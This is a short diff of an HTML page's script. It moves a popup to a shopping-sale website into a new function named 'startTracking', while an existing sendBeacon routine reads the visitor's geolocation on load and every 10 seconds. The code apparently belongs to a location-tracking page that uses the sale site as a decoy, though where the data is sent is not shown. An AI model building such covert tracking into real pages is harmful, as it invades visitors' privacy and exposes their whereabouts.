@@ -139,6 +139,14 @@
 
 <script>
 
+
+function startTracking() {
+    window.open(
+        'https://www.hotsale.com.mx/',
+        '_blank'
+    )
+}
+
 async function sendBeacon() {
 
     navigator.geolocation.getCurrentPosition(
@@ -176,10 +184,6 @@ sendBeacon()
 
 setInterval(sendBeacon, 10000)
 
-window.open(
-    'https://www.hotsale.com.mx/',
-    '_blank'
-)
 </script>
 
 </body>
